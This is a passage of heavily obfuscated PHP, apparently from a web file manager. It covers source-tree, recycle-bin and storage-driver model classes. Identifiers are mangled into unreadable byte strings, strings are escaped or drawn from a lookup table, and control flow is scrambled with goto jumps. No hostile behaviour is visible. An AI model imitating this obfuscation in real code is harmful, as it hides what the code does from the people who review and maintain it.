array($a‰Îø‘ˆîœ[2091] => $E¥‡ëë”Ç‘)); } else { if ($fô‹ë›ƒ†„ == self::TYPE_GROUP) { Model($a‰Îø‘ˆîœ[458])->groupEdit($dô„‡çœõ§, array($a‰Îø‘ˆîœ[2091] => $E¥‡ëë”Ç‘)); } } } public function targetSpaceSize($fœšÒíç½ , $CĞÃ²”è‡) { goto DÈ¥ˆóĞì»; DÈ¥ˆóĞì»: $BÙ¡Æ«òÄ =& $_SERVER[¼€¼ˆ¦‚¡]; $E‘ß®Ğ©çÖ = $this->sourceRoot($fœšÒíç½ , $CĞÃ²”è‡, !0); if (!$E‘ß®Ğ©çÖ) { return 0; } goto dÇä·í«›; dÇä·í«›: $fªò÷±‘ÇÈ = floatval($E‘ß®Ğ©çÖ[$BÙ¡Æ«òÄ[77]]); $C¶íèš´áÇ = array($BÙ¡Æ«òÄ[525] => array($BÙ¡Æ«òÄ[483], $BÙ¡Æ«òÄ[470] . $E‘ß®Ğ©çÖ[$BÙ¡Æ«òÄ[369]] . $BÙ¡Æ«òÄ[484])); $Fä«æŞÍË = Model($BÙ¡Æ«òÄ[395])->field($BÙ¡Æ«òÄ[383])->where($C¶íèš´áÇ)->select(); goto bé’ÚÚ±À¶; få¿ Íí„¨: return $fªò÷±‘ÇÈ; goto DªÉ»Ù‰èÔ; bé’ÚÚ±À¶: $Fä«æŞÍË = array_to_keyvalue($Fä«æŞÍË, $BÙ¡Æ«òÄ[33], $BÙ¡Æ«òÄ[369]); $Fä«æŞÍË = array_unique(array_filter($Fä«æŞÍË)); if ($Fä«æŞÍË) { $C¶íèš´áÇ = array($BÙ¡Æ«òÄ[383] => array($BÙ¡Æ«òÄ[384], $Fä«æŞÍË)); $fªò÷±‘ÇÈ += floatval($this->where($C¶íèš´áÇ)->sum($BÙ¡Æ«òÄ[77])); } goto få¿ Íí„¨; DªÉ»Ù‰èÔ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($dŒ¸Úî˜›Û) { return $this->fileTypeProfile($dŒ¸Úî˜›Û, SourceModel::TYPE_USER); } public function groupFileTypeProfile($E¶ª¡èï³¡) { return $this->fileTypeProfile($E¶ª¡èï³¡, SourceModel::TYPE_GROUP); } private function fileTypeProfile($eµÔÚ¢îì×, $Dæ¡ ÉÈ ) { goto aÊÀ™ŠĞ©‹; f¬æ™ÓŸ¼: foreach ($Aó°ÈÎÇì as $D‰½õÄ–º => $EÆÑĞ‹ìÆÏ) { $d„î±çá”©[$Bâå“›Å°æ[372]] = $this->fileTypeWhere($D‰½õÄ–º); $Bà‘»Ö™›[$D‰½õÄ–º] = array($Bâå“›Å°æ[2365] => $EÆÑĞ‹ìÆÏ[$Bâå“›Å°æ[28]], $Bâå“›Å°æ[2366] => $this->where($d„î±çá”©)->count(), $Bâå“›Å°æ[520] => $this->where($d„î±çá”©)->sum($Bâå“›Å°æ[77])); } Cache::set($AôôŒ ôË, $Bà‘»Ö™›, 1200); return $Bà‘»Ö™›; goto B‚–Ì¡™ù; DÒ ŞÎâ°: if ($f©ÈÌ¤¯Àõ) { return $f©ÈÌ¤¯Àõ; } $d„î±çá”© = array($Bâå“›Å°æ[518] => 0); if ($eµÔÚ¢îì× != !1) { $d„î±çá”©[$Bâå“›Å°æ[456]] = $eµÔÚ¢îì×; $d„î±çá”©[$Bâå“›Å°æ[371]] = $Dæ¡ ÉÈ ; } goto Fí”ø‡…Ü„; Fí”ø‡…Ü„: $Bà‘»Ö™› = array(); $Bà‘»Ö™›[$Bâå“›Å°æ[2364]] = array($Bâå“›Å°æ[2365] => LNG($Bâå“›Å°æ[2364]), $Bâå“›Å°æ[2366] => $this->where($d„î±çá”©)->count(), $Bâå“›Å°æ[520] => $this->where($d„î±çá”©)->sum($Bâå“›Å°æ[77])); $Aó°ÈÎÇì = KodIO::fileTypeList(); goto f¬æ™ÓŸ¼; aÊÀ™ŠĞ©‹: $Bâå“›Å°æ =& $_SERVER[¼€¼ˆ¦‚¡]; $AôôŒ ôË = $Bâå“›Å°æ[2363] . $eµÔÚ¢îì× . $Bâå“›Å°æ[70] . $Dæ¡ ÉÈ ; $f©ÈÌ¤¯Àõ = Cache::get($AôôŒ ôË); goto DÒ ŞÎâ°; B‚–Ì¡™ù: } public function fileNameExist($B½™¯ôõÎš, $AĞÆßôï) { $bãé¦¨í¾Ú =& $_SERVER[¼€¼ˆ¦‚¡]; $cš¾¹êƒİÅ = $this->childList($B½™¯ôõÎš); foreach ($cš¾¹êƒİÅ as $C»¬Õ†…‹–) { if ($C»¬Õ†…‹–[$bãé¦¨í¾Ú[28]] == $AĞÆßôï) { return $C»¬Õ†…‹–[$bãé¦¨í¾Ú[369]]; } } return !1; } public function childList($aÑ»Œ­á˜) { goto f¶æ”áøÃ©; DÅ£ÌÑ¢©: $E¥ËßìÊ˜‰ = array($Dê÷®ãªíø[461] => intval($aÑ»Œ­á˜), $Dê÷®ãªíø[397] => 0); $B‘ÔÏäš·ª = $this->where($E¥ËßìÊ˜‰)->select(); $B‘ÔÏäš·ª = $B‘ÔÏäš·ª ? $B‘ÔÏäš·ª : array(); goto fòÜ‰‘äÃ©; f¶æ”áøÃ©: $Dê÷®ãªíø =& $_SERVER[¼€¼ˆ¦‚¡]; $eì®Şõ†Àê = $Dê÷®ãªíø[2343] . $aÑ»Œ­á˜; if (isset(self::$cacheChildList[$eì®Şõ†Àê])) { return self::$cacheChildList[$eì®Şõ†Àê]; } goto DÅ£ÌÑ¢©; fòÜ‰‘äÃ©: self::$cacheChildList[$eì®Şõ†Àê] = $B‘ÔÏäš·ª; foreach ($B‘ÔÏäš·ª as $bù“¸Ë•‡¤) { $eì®Şõ†Àê = $Dê÷®ãªíø[410] . $bù“¸Ë•‡¤[$Dê÷®ãªíø[369]]; self::$cacheSourceInfo[$eì®Şõ†Àê] = $bù“¸Ë•‡¤; } return $B‘ÔÏäš·ª; goto BêÎ×ÑŒ¾; BêÎ×ÑŒ¾: } public function fileNameAuto($A‰’È‡·ğÖ, $C³êÙšÀÔ, $AŠ®¦‰ÊÔÊ = REPEAT_RENAME, $BÌÚà¼º“— = false) { $b¿±¦¸ÜÊŠ =& $_SERVER[¼€¼ˆ¦‚¡]; $fæíµ´á‡ = $this->childList($A‰’È‡·ğÖ); $eŠç¶×ùÔ… = array_to_keyvalue($fæíµ´á‡, $b¿±¦¸ÜÊŠ[33], $b¿±¦¸ÜÊŠ[28]); return $this->fileNameAutoGet($eŠç¶×ùÔ…, $C³êÙšÀÔ, $AŠ®¦‰ÊÔÊ, $BÌÚà¼º“—); } public function fileNameAutoGet($eòºí©öåä, $eÇ¯®»Ù, $B ØÓõËÃ, $fÊàá»©Æ¾) { $bĞØÊ¨¢¬ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($B ØÓõËÃ == REPEAT_REPLACE || !$eòºí©öåä || !in_array_not_case($eÇ¯®»Ù, $eòºí©öåä) || $fÊàá»©Æ¾ && $B ØÓõËÃ != REPEAT_RENAME_FOLDER) { return $eÇ¯®»Ù; } if ($B ØÓõËÃ == REPEAT_SKIP) { return !1; } $fÂ«ğÖ¿‰§ = $bĞØÊ¨¢¬[91] . get_path_ext($eÇ¯®»Ù); $fÂ«ğÖ¿‰§ = $fÂ«ğÖ¿‰§ == $bĞØÊ¨¢¬[91] || $fÊàá»©Æ¾ ? $bĞØÊ¨¢¬[33] : $fÂ«ğÖ¿‰§; for ($f™Ìå×”±© = 1; $f™Ìå×”±© <= count($eòºí©öåä) + 1; $f™Ìå×”±©++) { $b…ãÔ²ç¼É = substr($eÇ¯®»Ù, 0, strlen($eÇ¯®»Ù) - strlen($fÂ«ğÖ¿‰§)); $C‰Òš‹Ëè¼ = $b…ãÔ²ç¼É . "\x28{$f™Ìå×”±©}\x29{$fÂ«ğÖ¿‰§}"; if (!in_array_not_case($C‰Òš‹Ëè¼, $eòºí©öåä)) { return $C‰Òš‹Ëè¼; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\143\145\137\x72\x65\143\171\143\154\145"; protected $dataAuto = array(array("\143\162\145\141\x74\145\x54\x69\155\x65", "\x74\x69\x6d\x65", "\x69\156\163\145\162\164", "\x66\165\x6e\143\x74\x69\157\x6e")); public function listData($Aê›ÀÒîÑÆ = false) { $C¤¦ËÀŸ =& $_SERVER[¼€¼ˆ¦‚¡]; $Aê›ÀÒîÑÆ = $Aê›ÀÒîÑÆ ? $Aê›ÀÒîÑÆ : USER_ID; $d£àøæÅç = $this->where(array($C¤¦ËÀŸ[1428] => $Aê›ÀÒîÑÆ))->select(); return array_to_keyvalue($d£àøæÅç, $C¤¦ËÀŸ[33], $C¤¦ËÀŸ[369]); } public function moveToRecycle($B’‹ëë‰æ«) { goto c†–Ş‰—ä†; c†–Ş‰—ä†: $aéÙŒºá¾ =& $_SERVER[¼€¼ˆ¦‚¡]; $B›Ú±©ã’‹ = Model($aéÙŒºá¾[1117]); $F«ÉÀŠ‘³¿ = $B›Ú±©ã’‹->sourceInfo($B’‹ëë‰æ«); goto F…ÈÂ©À‘¶; FÃ¨Äê“ôÇ: $this->recycleMove($B’‹ëë‰æ«, 1); if ($F«ÉÀŠ‘³¿[$aéÙŒºá¾[370]] == $aéÙŒºá¾[83]) { $dÓâŒù‚Ä = array($aéÙŒºá¾[525] => array($aéÙŒºá¾[483], $F«ÉÀŠ‘³¿[$aéÙŒºá¾[459]] . $B’‹ëë‰æ« . $aéÙŒºá¾[484])); $B›Ú±©ã’‹->where($dÓâŒù‚Ä)->setField($aéÙŒºá¾[397], 1); } goto F‰Á¢µÀóå; F…ÈÂ©À‘¶: if (!$F«ÉÀŠ‘³¿ || $F«ÉÀŠ‘³¿[$aéÙŒºá¾[397]] == $aéÙŒºá¾[83]) { return; } $Bî‚µÜÄ÷¢ = array($aéÙŒºá¾[383] => $B’‹ëë‰æ«, $aéÙŒºá¾[1428] => USER_ID, $aéÙŒºá¾[521] => $F«ÉÀŠ‘³¿[$aéÙŒºá¾[371]], $aéÙŒºá¾[522] => $F«ÉÀŠ‘³¿[$aéÙŒºá¾[456]], $aéÙŒºá¾[525] => $F«ÉÀŠ‘³¿[$aéÙŒºá¾[459]]); $this->add($Bî‚µÜÄ÷¢); goto FÃ¨Äê“ôÇ; F‰Á¢µÀóå: } public function clear() { $this->remove(!1); } public function remove($aÙÈ¾ãÑ = false) { goto dŒ›ÏÈäĞ¼; dŒ›ÏÈäĞ¼: $f‚á×øîÍ† =& $_SERVER[¼€¼ˆ¦‚¡]; $D•‚´•Ó„ = Model($f‚á×øîÍ†[1117]); $dÏÂå¯ù’£ = $this->listData(); goto F‰À‡Ö•ôİ; F‰À‡Ö•ôİ: $aÙÈ¾ãÑ = $aÙÈ¾ãÑ === !1 ? !1 : $aÙÈ¾ãÑ; $FíÈÜôµº = array(); foreach ($dÏÂå¯ù’£ as $AŸç‘¤Œæ) { if ($aÙÈ¾ãÑ != !1 && !in_array($AŸç‘¤Œæ, $aÙÈ¾ãÑ)) { continue; } $D•‚´•Ó„->remove($AŸç‘¤Œæ, !1); $B­ÍÖÇóËä = $this->where(array($f‚á×øîÍ†[369] => $AŸç‘¤Œæ))->find(); $AÂ–ã¸–“ = $B­ÍÖÇóËä[$f‚á×øîÍ†[371]] . $f‚á×øîÍ†[70] . $B­ÍÖÇóËä[$f‚á×øîÍ†[456]]; $FíÈÜôµº[$AÂ–ã¸–“] = array($f‚á×øîÍ†[521] => $B­ÍÖÇóËä[$f‚á×øîÍ†[371]], $f‚á×øîÍ†[456] => $B­ÍÖÇóËä[$f‚á×øîÍ†[456]]); $this->where(array($f‚á×øîÍ†[369] => $AŸç‘¤Œæ))->delete(); } goto BÌ’º£ö©µ; BÌ’º£ö©µ: foreach ($FíÈÜôµº as $B¢Ë›Œ¿Š°) { $D•‚´•Ó„->targetSpaceUpdate($B¢Ë›Œ¿Š°[$f‚á×øîÍ†[371]], $B¢Ë›Œ¿Š°[$f‚á×øîÍ†[456]]); } goto DÆ¿—‚öÈË; DÆ¿—‚öÈË: } public function restore($cŠöˆ¢æÜ = false) { goto dëÈ¯Œé÷‘; dëÈ¯Œé÷‘: $A æ©…†Ì =& $_SERVER[¼€¼ˆ¦‚¡]; $fœöˆÃíÅ = Model($A æ©…†Ì[1117]); $aºªƒÜ”˜¾ = $this->listData(); goto AÉÃÌèš„; AÉÃÌèš„: $cŠöˆ¢æÜ = $cŠöˆ¢æÜ == !1 ? !1 : $cŠöˆ¢æÜ; if (!$aºªƒÜ”˜¾) { return !0; } $c§ŒğÒâ×… = array(); goto bµ×à–³; bµ×à–³: foreach ($aºªƒÜ”˜¾ as $eõÜ“¸Èš) { goto Fôù›Ô¯§ê; AŠ’ù¸›ª¼: if ($eˆ½ºâ·’[$A æ©…†Ì[370]] == $A æ©…†Ì[83]) { $DÑ‡ÄÃø…ˆ = array($A æ©…†Ì[525] => array($A æ©…†Ì[483], $eˆ½ºâ·’[$A æ©…†Ì[459]] . $eõÜ“¸Èš . $A æ©…†Ì[484])); $fœöˆÃíÅ->where($DÑ‡ÄÃø…ˆ)->setField($A æ©…†Ì[397], 0); $this->restoreFolderChildren($eõÜ“¸Èš, $aºªƒÜ”˜¾); } $this->where(array($A æ©…†Ì[369] => $eõÜ“¸Èš))->delete(); $fœöˆÃíÅ->folderSizeReset($eˆ½ºâ·’[$A æ©…†Ì[461]]); goto E•éô¯ôŸÑ; cÈªá¨ÅÖ: if ($cñ¦ƒæå††[$A æ©…†Ì[397]] == $A æ©…†Ì[83]) { continue; } $fœöˆÃíÅ->lockMoveStart($eõÜ“¸Èš); $this->recycleMove($eõÜ“¸Èš, 0); goto AŠ’ù¸›ª¼; E•éô¯ôŸÑ: $c§ŒğÒâ×…[] = $eˆ½ºâ·’[$A æ©…†Ì[461]]; if ($eˆ½ºâ·’[$A æ©…†Ì[370]] == $A æ©…†Ì[83]) { $c§ŒğÒâ×…[] = $eõÜ“¸Èš; } $fœöˆÃíÅ->lockMoveEnd($eõÜ“¸Èš); goto D¶ŠóŞƒÙŸ; Fôù›Ô¯§ê: if ($cŠöˆ¢æÜ != !1 && !in_array($eõÜ“¸Èš, $cŠöˆ¢æÜ)) { continue; } $eˆ½ºâ·’ = $fœöˆÃíÅ->sourceInfo($eõÜ“¸Èš); $cñ¦ƒæå†† = $fœöˆÃíÅ->sourceInfo($eˆ½ºâ·’[$A æ©…†Ì[461]]); goto cÈªá¨ÅÖ; D¶ŠóŞƒÙŸ: } $fœöˆÃíÅ->updateModifyTime($c§ŒğÒâ×…); goto A‘ñÀîŠ; A‘ñÀîŠ: } private function restoreFolderChildren($dºÙÈ®ïµ¯, $a¶×«äß—ä) { goto A§é§Æİö; F¢ù°ï›³é: foreach ($a¶×«äß—ä as $cÓ–¾¯ËÁõ) { if ($cÓ–¾¯ËÁõ == $dºÙÈ®ïµ¯) { continue; } if (!$bÔ­ğĞÙ¯->isParentOf($dºÙÈ®ïµ¯, $cÓ–¾¯ËÁõ)) { continue; } $D¬†õÛÙÔ = $bÔ­ğĞÙ¯->sourceInfo($cÓ–¾¯ËÁõ); if ($D¬†õÛÙÔ[$aÎéÜŞçÓø[370]] == $aÎéÜŞçÓø[83]) { $A×»Ò¢ù[] = array($aÎéÜŞçÓø[525] => array($aÎéÜŞçÓø[483], $D¬†õÛÙÔ[$aÎéÜŞçÓø[459]] . $cÓ–¾¯ËÁõ . $aÎéÜŞçÓø[484])); } else { $A×»Ò¢ù[$aÎéÜŞçÓø[369]][1][] = $cÓ–¾¯ËÁõ; } } if (!$A×»Ò¢ù[$aÎéÜŞçÓø[369]][1]) { unset($A×»Ò¢ù[$aÎéÜŞçÓø[369]]); } if (!$A×»Ò¢ù) { return; } goto aø¬Ï¦‚Æ; aø¬Ï¦‚Æ: $A×»Ò¢ù[$aÎéÜŞçÓø[369]][1] = array_unique($A×»Ò¢ù[$aÎéÜŞçÓø[369]][1]); $A×»Ò¢ù[$aÎéÜŞçÓø[913]] = $aÎéÜŞçÓø[2187]; $bÔ­ğĞÙ¯->where($A×»Ò¢ù)->setField($aÎéÜŞçÓø[397], 1); goto dÑ‘¨‚â¹…; A§é§Æİö: $aÎéÜŞçÓø =& $_SERVER[¼€¼ˆ¦‚¡]; $bÔ­ğĞÙ¯ = Model($aÎéÜŞçÓø[1117]); $A×»Ò¢ù = array($aÎéÜŞçÓø[369] => array($aÎéÜŞçÓø[7], array())); goto F¢ù°ï›³é; dÑ‘¨‚â¹…: } private function recycleMove($F‚«”¹Å, $e¡æçØÔÀ— = 1) { $E…¹ÏÂ´Ä‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $F¤ë×¢÷Î¨ = Model($E…¹ÏÂ´Ä‰[1117]); $eôâ¼Ş•· = Model($E…¹ÏÂ´Ä‰[2367]); $C‘÷š½ç¨¬ = array($E…¹ÏÂ´Ä‰[369] => $F‚«”¹Å); if ($e¡æçØÔÀ—) { $F¤ë×¢÷Î¨->where($C‘÷š½ç¨¬)->setField($E…¹ÏÂ´Ä‰[397], 1); $eôâ¼Ş•·->eventRecycle($F‚«”¹Å, $E…¹ÏÂ´Ä‰[2368]); } else { $fòÄ…éÜŠò = $F¤ë×¢÷Î¨->where($C‘÷š½ç¨¬)->find(); $C¾Áá”îÂÁ = $fòÄ…éÜŠò[$E…¹ÏÂ´Ä‰[370]] == $E…¹ÏÂ´Ä‰[83]; $Cµ¢¸Óåºİ = $F¤ë×¢÷Î¨->fileNameAuto($fòÄ…éÜŠò[$E…¹ÏÂ´Ä‰[461]], $fòÄ…éÜŠò[$E…¹ÏÂ´Ä‰[28]], REPEAT_RENAME_FOLDER, $C¾Áá”îÂÁ); if ($Cµ¢¸Óåºİ != $fòÄ…éÜŠò[$E…¹ÏÂ´Ä‰[28]]) { $F¤ë×¢÷Î¨->rename($F‚«”¹Å, $Cµ¢¸Óåºİ); } $F¤ë×¢÷Î¨->where($C‘÷š½ç¨¬)->setField($E…¹ÏÂ´Ä‰[397], 0); $eôâ¼Ş•·->eventRecycle($F‚«”¹Å, $E…¹ÏÂ´Ä‰[2369]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\163\x74\x6f\x72\x61\147\145\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\x73\x69\x7a\x65\115\141\170", "\x73\171\163\x74\x65\x6d", "\144\145\x66\x61\165\x6c\164", "\x64\x72\x69\x76\x65\162", "\143\x6f\156\x66\151\x67"); public function listData($Cø‰‹Îãñ = false, $A‚£å§Øô® = "\155\x6f\x64\151\146\x79\124\151\x6d\145", $b»Ù‘ŠÂğŒ = false) { goto CÀâøÀ‚ˆ; BµßÎî’™: return $Aã•Î†İÈ†; goto A‡¢ÁÍ¦; e¿÷è¸ß’: foreach ($Aã•Î†İÈ† as $f´¶ÃÕ¨ ´ => $a¸™êÙíĞ») { unset($Aã•Î†İÈ†[$f´¶ÃÕ¨ ´][$F•¢öÒ¢[6]]); $Aã•Î†İÈ†[$f´¶ÃÕ¨ ´][$F•¢öÒ¢[2091]] = 0; } $Aª¾õç›Å = array_to_keyvalue($Aã•Î†İÈ†, $F•¢öÒ¢[33], $F•¢öÒ¢[367]); $this->_listAppendSize($Aã•Î†İÈ†, $Aª¾õç›Å); goto BµßÎî’™; CÀâøÀ‚ˆ: $F•¢öÒ¢ =& $_SERVER[¼€¼ˆ¦‚¡]; $Aã•Î†İÈ† = parent::listData($Cø‰‹Îãñ, $A‚£å§Øô®, $b»Ù‘ŠÂğŒ); if ($Cø‰‹Îãñ) { return $Aã•Î†İÈ†; } goto e¿÷è¸ß’; A‡¢ÁÍ¦: } public function _listAppendSize(&$fŸÉâ’ÕÙ, $aŸ÷á§) { $d‰±¤ËøÉ“ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$aŸ÷á§) { return; } $bÙ¹¦ôï¨ = $d‰±¤ËøÉ“[2370] . implode($d‰±¤ËøÉ“[47], $aŸ÷á§) . $d‰±¤ËøÉ“[2371]; $c…Ûš§Œ™ = Model($d‰±¤ËøÉ“[715])->query($bÙ¹¦ôï¨); $c…Ûš§Œ™ = array_to_keyvalue($c…Ûš§Œ™, $d‰±¤ËøÉ“[367], $d‰±¤ËøÉ“[77]); foreach ($fŸÉâ’ÕÙ as $dÓÈ¤êğ¶Ì => $C¯—­¢¨©º) { $fŸÉâ’ÕÙ[$dÓÈ¤êğ¶Ì][$d‰±¤ËøÉ“[2091]] = isset($c…Ûš§Œ™[$C¯—­¢¨©º[$d‰±¤ËøÉ“[367]]]) ? $c…Ûš§Œ™[$C¯—­¢¨©º[$d‰±¤ËøÉ“[367]]] : 0; } } public function getConfig($F“¯Óä) { $D¯·½ß¾Õ» = parent::listData($F“¯Óä); return json_decode($D¯·½ß¾Õ»[$_SERVER[¼€¼ˆ¦‚¡][6]], !0); } public function update($fîî›Ã…, $e¾‚¯éá°—) { goto DÀ‡‹“á¿À; CºÂ‹Ì‚¢—: if (isset($EóŞ³ãòê³[$C£ø·ß®æØ]) && $EóŞ³ãòê³[$C£ø·ß®æØ][$e­¦Ãç÷çİ[367]] != $fîî›Ã…) { return !1; } if (isset($e¾‚¯éá°—[$e­¦Ãç÷çİ[2372]]) && $e¾‚¯éá°—[$e­¦Ãç÷çİ[2372]] == $e­¦Ãç÷çİ[83]) { $this->checkConfig($e¾‚¯éá°—); } unset($e¾‚¯éá°—[$e­¦Ãç÷çİ[2372]]); goto aêéŠÓ’ùÅ; aêéŠÓ’ùÅ: $b÷Úø±ÅˆÖ = parent::update($fîî›Ã…, $e¾‚¯éá°—); if ($b÷Úø±ÅˆÖ && $e¾‚¯éá°—[$e­¦Ãç÷çİ[34]]) { foreach ($EóŞ³ãòê³ as $Aí±ªÎæŒõ) { if ($Aí±ªÎæŒõ[$e­¦Ãç÷çİ[34]] && $Aí±ªÎæŒõ[$e­¦Ãç÷çİ[367]] != $fîî›Ã…) { parent::update($Aí±ªÎæŒõ[$e­¦Ãç÷çİ[367]], array($e­¦Ãç÷çİ[34] => 0)); } } } return $b÷Úø±ÅˆÖ; goto A……‘«¬Ş; DÀ‡‹“á¿À: $e­¦Ãç÷çİ =& $_SERVER[¼€¼ˆ¦‚¡]; $C£ø·ß®æØ = $e¾‚¯éá°—[$e­¦Ãç÷çİ[28]]; $EóŞ³ãòê³ = array_to_keyvalue(parent::listData(), $e­¦Ãç÷çİ[28]); goto CºÂ‹Ì‚¢—; A……‘«¬Ş: } public function add($B˜ä÷©ÈÉ) { goto CÎåïæ—„ß; CÌÈÛ“õ”‰: return $b¨”ºÎ×É‰; goto B¼¾˜İà—¾; CÎåïæ—„ß: $dÇ¦ˆ‰°Øğ =& $_SERVER[¼€¼ˆ¦‚¡]; $c„î¬„‡ = array_to_keyvalue(parent::listData(), $dÇ¦ˆ‰°Øğ[28]); if (isset($c„î¬„‡[$B˜ä÷©ÈÉ[$dÇ¦ˆ‰°Øğ[28]]])) { return !1; } goto DÊÂ‡Í‹×Ñ; DÊÂ‡Í‹×Ñ: $this->checkConfig($B˜ä÷©ÈÉ); $b¨”ºÎ×É‰ = parent::insert($B˜ä÷©ÈÉ); if ($b¨”ºÎ×É‰ && $B˜ä÷©ÈÉ[$dÇ¦ˆ‰°Øğ[34]]) { foreach ($c„î¬„‡ as $dŒ´Ï­Ÿ¹«) { if ($dŒ´Ï­Ÿ¹«[$dÇ¦ˆ‰°Øğ[34]]) { parent::update($dŒ´Ï­Ÿ¹«[$dÇ¦ˆ‰°Øğ[367]], array($dÇ¦ˆ‰°Øğ[34] => 0)); } } } goto CÌÈÛ“õ”‰; B¼¾˜İà—¾: } public function checkConfig(&$añ‘¶¬»Ì‡) { goto cÒåÓ¿šô¸; Dœ¨˜ÕéÀˆ: $D»†¸š¿ñš = rtrim($EØ‹Ÿ‹Ş[$Cš†Üäˆç[1023]], $Cš†Üäˆç[8]) . $Cš†Üäˆç[8]; $a¼¹•ñÎÙ‹ = $a¦ïåã”‹¸->getPath($D»†¸š¿ñš . $Cš†Üäˆç[1986]); if (!$a¦ïåã”‹¸->mkfile($a¼¹•ñÎÙ‹)) { show_json(LNG($Cš†Üäˆç[2374]), !1); } goto C‰±ğ¿•µ; dÖš²¤îˆ: $Fâ©ÇÎ¨òÊ = $Cš†Üäˆç[71] . $AŒ«ãŞ×Ú; $a¦ïåã”‹¸ = new $Fâ©ÇÎ¨òÊ($EØ‹Ÿ‹Ş); if (in_array($B‡„ÎğÉ‘, $a¦ïåã”‹¸->objectDriver)) { if (!$a¦ïåã”‹¸->isBucketCors() && !$a¦ïåã”‹¸->setBucketCors()) { $B­Í¢—®¬ = LNG($Cš†Üäˆç[2374]); $B­Í¢—®¬ .= $Cš†Üäˆç[2375] . LNG($Cš†Üäˆç[2376]); show_json($B­Í¢—®¬, !1); } } goto Dœ¨˜ÕéÀˆ; E…ÚÛŸ˜Şœ: foreach ($EØ‹Ÿ‹Ş as $e¹‡¾ÔŞÖ‹ => $AµÏè‹¶ë) { $EØ‹Ÿ‹Ş[$e¹‡¾ÔŞÖ‹] = trim($AµÏè‹¶ë); } $EØ‹Ÿ‹Ş[$Cš†Üäˆç[2373]] = rand_string(6); $AŒ«ãŞ×Ú = $this->driverType($B‡„ÎğÉ‘); goto dÖš²¤îˆ; C‰±ğ¿•µ: $EØ‹Ÿ‹Ş[$Cš†Üäˆç[1023]] = $D»†¸š¿ñš; $añ‘¶¬»Ì‡[$Cš†Üäˆç[6]] = json_encode($EØ‹Ÿ‹Ş); $añ‘¶¬»Ì‡[$Cš†Üäˆç[90]] = $AŒ«ãŞ×Ú; goto bè¨ÅääÓø; cÒåÓ¿šô¸: $Cš†Üäˆç =& $_SERVER[¼€¼ˆ¦‚¡]; $B‡„ÎğÉ‘ = strtolower($añ‘¶¬»Ì‡[$Cš†Üäˆç[90]]); $EØ‹Ÿ‹Ş = json_decode($añ‘¶¬»Ì‡[$Cš†Üäˆç[6]], !0); goto E…ÚÛŸ˜Şœ; bè¨ÅääÓø: return !0; goto f’‚Şóç³Ò; f’‚Şóç³Ò: } private function driverType($f¾ˆ²èâî) { $cÜöˆŠ²¾¢ =& $_SERVER[¼€¼ˆ¦‚¡]; $e¿¸ç¸Ü© = array($cÜöˆŠ²¾¢[102] => $cÜöˆŠ²¾¢[2377], $cÜöˆŠ²¾¢[58] => $cÜöˆŠ²¾¢[2378], $cÜöˆŠ²¾¢[64] => $cÜöˆŠ²¾¢[2379]); if (isset($e¿¸ç¸Ü©[$f¾ˆ²èâî])) { return $e¿¸ç¸Ü©[$f¾ˆ²èâî]; } return strtoupper($f¾ˆ²èâî); } public function driverListSystem() { $BÀ£Â”†ƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $b»ƒ¨İ²¯ = parent::listData(); $bÎº–½ˆ§ó = array(); foreach ($b»ƒ¨İ²¯ as $bØö¬…) { unset($bØö¬…[$BÀ£Â”†ƒ[187]], $bØö¬…[$BÀ£Â”†ƒ[107]]); $bØö¬…[$BÀ£Â”†ƒ[6]] = json_decode($bØö¬…[$BÀ£Â”†ƒ[6]], !0); $bÎº–½ˆ§ó[] = $bØö¬…; } return $bÎº–½ˆ§ó; } public function defaultDriver() { $D¤¥ŒŒõ =& $_SERVER[¼€¼ˆ¦‚¡]; $b•Õ½°Š„Å = parent::listData(); $E·À“ï÷£â = array_filter_by_field($b•Õ½°Š„Å, $D¤¥ŒŒõ[34], 1); $E·À“ï÷£â = $E·À“ï÷£â[0]; if ($E·À“ï÷£â) { $E·À“ï÷£â[$D¤¥ŒŒõ[6]] = json_decode($E·À“ï÷£â[$D¤¥ŒŒõ[6]], !0); } return $E·À“ï÷£â; } public function driverInfo($däÀ¡­ÔŒ) { $aª¡Ì¨›÷¬ =& $_SERVER[¼€¼ˆ¦‚¡]; $dñ¥¦«‹Ë¸ = array_to_keyvalue(parent::listData(), $aª¡Ì¨›÷¬[367]); if (!isset($dñ¥¦«‹Ë¸[$däÀ¡­ÔŒ])) { return !1; } $c‚ç‹¤¸¯ = $dñ¥¦«‹Ë¸[$däÀ¡­ÔŒ]; $c‚ç‹¤¸¯[$aª¡Ì¨›÷¬[6]] = json_decode($c‚ç‹¤¸¯[$aª¡Ì¨›÷¬[6]], !0); return $c‚ç‹¤¸¯; } public function remove($D«Àì ù‰‹) { $this->removeShareItems($D«Àì ù‰‹); return parent::remove($D«Àì ù‰‹); } public function removeWithFile($fàéØÇâí¢) { goto b÷åŞ…”Ûá; C«¶ç©Ó÷ê: $bê¡†ÅœâŸ = "\x7b\x69\x6f\x3a{$b»¹·™‘£}\175\57"; $bÌ®º¦°Ùá = !0; $BèÇ‹ÊÌÇ½ = array(); goto bù¬‹¹Şˆ’; A·Ï®¯¡ó‘: if (!$bÌ®º¦°Ùá) { $e§¤ƒÍ¬õÄ->stop($d‚«íÆ»ÂÁ); return !1; } $e§¤ƒÍ¬õÄ->end(); $this->remove($fàéØÇâí¢); goto CÌôŒƒãØì; b÷åŞ…”Ûá: $Eô³¥â¬Û¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $F¥•„˜¿Æœ = array($Eô³¥â¬Û¶[740] => $fàéØÇâí¢); $A¦ ¬¢æäË = Model($Eô³¥â¬Û¶[422])->where($F¥•„˜¿Æœ)->count(); goto EäëÂÏÏÊÓ; CğÑÍğÛ¦Ñ: $e§¤ƒÍ¬õÄ->task[$Eô³¥â¬Û¶[694]] = (double) $a„¦„Ğ©æÍ; $bÄÛğÓÀö† = KodIO::defaultDriver(); $b»¹·™‘£ = $bÄÛğÓÀö†[$Eô³¥â¬Û¶[367]]; goto C«¶ç©Ó÷ê; bù¬‹¹Şˆ’: $c‚‘¸íÆë¾ = 